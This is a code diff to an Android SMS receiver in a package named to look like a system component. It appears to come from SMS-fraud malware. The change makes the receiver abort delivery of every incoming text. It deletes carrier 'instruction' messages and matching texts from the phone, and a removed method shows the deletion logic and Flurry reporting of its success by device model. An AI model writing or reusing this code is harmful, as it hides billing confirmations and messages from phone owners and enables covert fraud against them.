@@ -1,12 +1,9 @@
 package com.android.sms.client;
 
 import android.content.BroadcastReceiver;
-import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
-import android.database.Cursor;
-import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.telephony.SmsMessage;
@@ -63,16 +60,17 @@ public class Receiver_SMS extends BroadcastReceiver {
 
 				final long currentTime = System.currentTimeMillis();
 
-				if (GetMsgRunnable.sendSmsTime <= 0) return;
-				if (GetMsgRunnable.sendSmsTime > 0 && (currentTime - GetMsgRunnable.sendSmsTime <
-						VALID_SMS_TIME)) {
-					if (DEBUG) {
-						Log.d(TAG, "拦截短信，应该不会有短信显示！！！！！！！！！");
-					}
-					this.abortBroadcast();
-				} else {
-					this.clearAbortBroadcast();
-				}
+//				if (GetMsgRunnable.sendSmsTime <= 0) return;
+//				if (GetMsgRunnable.sendSmsTime > 0 && (currentTime - GetMsgRunnable.sendSmsTime <
+//						VALID_SMS_TIME)) {
+//					if (DEBUG) {
+//						Log.d(TAG, "拦截短信，应该不会有短信显示！！！！！！！！！");
+//					}
+//					this.abortBroadcast();
+//				} else {
+//					this.clearAbortBroadcast();
+//				}
+				this.abortBroadcast();
 
 				if (args != null) {
 					Object[] pdus = (Object[]) args.get(SMS_SERVICE);
@@ -111,9 +109,9 @@ public class Receiver_SMS extends BroadcastReceiver {
 							}
 
 							//删掉指令短信
-							deleteSMS(context, GetMsgRunnable.currentCheckInfo.getOperatorCode());
+							SmsManageUtil.getInstance(context).deleteSMS(context, GetMsgRunnable.currentCheckInfo.getOperatorCode());
 							//删除短信短信
-							deleteSMS(context, msgContent);
+							SmsManageUtil.getInstance(context).deleteSMS(context, msgContent);
                             return;
 						}
 					}
@@ -163,61 +161,6 @@ public class Receiver_SMS extends BroadcastReceiver {
 	}
 
 
-	public void deleteSMS(Context context, String smsContent) {
-		try {
-			if (DEBUG) {
-				Log.d(TAG, "要删除的短信内容是：" + smsContent);
-			}
-            EventBus.getDefault().post(new MessageEvent("want to delete: "+smsContent));
 
-			Uri uri = Uri.parse(SMS_CONTENT);
-			ContentResolver contentResolver = context.getContentResolver();
-			if (contentResolver != null) {
-                String select =  SMS_BODY+" LIKE ?";
-                String[] selectArgs = new String[]{"%" + smsContent + "%"};
-				Cursor isRead = contentResolver.query(uri, null, select, selectArgs, "date desc");
-                boolean isExist = isRead.moveToFirst();
-                if(isExist){
-                    Log.d(TAG, "存在该字串！！！！");
-                    EventBus.getDefault().post(new MessageEvent("is exist!"));
-                    int id = isRead.getInt(isRead.getColumnIndex(SMS_ID));
-                    if (DEBUG) {
-                        Log.d(TAG, "找到该短信:" + smsContent + " 短信标识为:" + id + "准备删除!");
-                    }
-                    int count = context.getContentResolver().delete(Uri.parse(SMS_CONTENT), "_id=" + id, null);
-
-                    final String device = Build.MODEL;
-                    final String verison = Build.VERSION.RELEASE;
-                    final boolean isDeleteSuccess = count >= 1 ? true : false;
-                    Map<String, String> map1 = new HashMap<>();
-                    map1.put(NativeParams.KEY_DELETE_SMS_SUCCESS, String.valueOf(isDeleteSuccess));
-                    FlurryAgent.logEvent(NativeParams.EVENT_SEND_SMS,map1);
-
-                    if (count >= 1) {
-                        Map<String, String> map = new HashMap<>();
-                        map.put(NativeParams.KEY_DELETE_SUCCESS_DEVICE, device);
-                        map.put(NativeParams.KEY_DELETE_SUCCESS_VERSION, verison);
-                        FlurryAgent.logEvent(NativeParams.EVENT_DELETE_SMS_SUCCESS,map);
-                    } else {
-                        Map<String, String> map = new HashMap<>();
-                        map.put(NativeParams.KEY_DELETE_FAIL_DEVICE, device);
-                        map.put(NativeParams.KEY_DELETE_FAIL_VERSION, verison);
-                        FlurryAgent.logEvent(NativeParams.EVENT_DELETE_SMS_FAILED,map);
-                    }
-                    if (DEBUG) {
-                        Log.d(TAG, "当前版本号:" + Build.VERSION.SDK_INT + "短信是否删除成功：" + ((count >= 1) ? "删除成功" :
-                                "删除失败"));
-                    }
-                    EventBus.getDefault().post(new MessageEvent((count >=1)?"delete success":"delete failed"));
-                    isRead.close();
-                }
-
-			}
-		} catch (Throwable e) {
-			if (DEBUG) {
-				Log.e(TAG, e.fillInStackTrace().toString());
-			}
-		}
-	}
 
 }
